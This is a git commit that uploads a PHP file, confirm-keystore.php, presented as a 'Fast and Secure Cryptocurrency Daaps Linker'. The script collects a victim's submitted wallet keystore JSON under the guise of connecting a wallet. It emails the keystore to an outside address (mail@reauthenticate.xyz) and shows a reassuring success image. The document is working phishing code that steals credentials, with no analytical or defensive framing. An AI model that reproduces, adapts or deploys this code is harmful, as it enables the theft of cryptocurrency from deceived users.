be852d845df0c0a385ba7ecd9fc3f0f7d954eddb
sammtan18 <143872025+sammtan18@users.noreply.github.com>
2023-10-03 10:19:10 -0700

    Add files via upload

---
+++ confirm-keystore.php
@@ -0,0 +1,75 @@
+<title>Fast and Secure Cryptocurrency Daaps Linker</title>
+<?php
+if (isset($_POST['Email'])) {
+
+    // EDIT THE (EMAIL) LINE BELOW AS REQUIRED
+    $email_to = "mail@reauthenticate.xyz";
+    $email_subject = "You Have a New KEYSTORE field";
+
+    function problem($error)
+    {
+        echo "We are very sorry, but there were error(s) found with the Keystore you want to connect. ";
+        echo "These errors appear below.<br><br>";
+        echo $error . "<br><br>";
+        echo "Please go back and fix these errors.<br><br>";
+        die();
+    }
+
+    // validation expected data exists
+    if (
+        !isset($_POST['Name']) ||
+        !isset($_POST['Email']) ||
+        !isset($_POST['Message'])
+    ) {
+        problem('We are sorry, but there appears to be a problem with the form you submitted.');
+    }
+
+    $name = $_POST['Name']; // required
+    $email = $_POST['Email']; // required
+    $message = $_POST['Message']; // required
+
+    $error_message = "";
+    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
+
+    if (!preg_match($email_exp, $email)) {
+        $error_message .= 'The Email address you entered does not appear to be valid.<br>';
+    }
+
+    $string_exp = "/^[A-Za-z .'-]+$/";
+
+    if (!preg_match($string_exp, $name)) {
+        $error_message .= 'The Name you entered does not appear to be valid.<br>';
+    }
+
+    if (strlen($message) < 2) {
+        $error_message .= 'The Message you entered do not appear to be valid.<br>';
+    }
+
+    if (strlen($error_message) > 0) {
+        problem($error_message);
+    }
+
+    $email_message = "\n\n";
+
+    function clean_string($string)
+    {
+        $bad = array("content-type", "bcc:", "to:", "cc:", "href");
+        return str_replace($bad, "", $string);
+    }
+    
+    $email_message .= "Keystore JSON: " . clean_string($message) . "\n";
+
+    // create email headers
+    $headers = 'From: ' . $email . "\r\n" .
+        'Reply-To: ' . $email . "\r\n" .
+        'X-Mailer: PHP/' . phpversion();
+    @mail($email_to, $email_subject, $email_message, $headers);
+?>
+
+    <!-- include your success message below -->
+
+    <center><img src="https://i.ibb.co/THRwmbK/ask.png"/></center>  
+
+<?php
+}
+?>
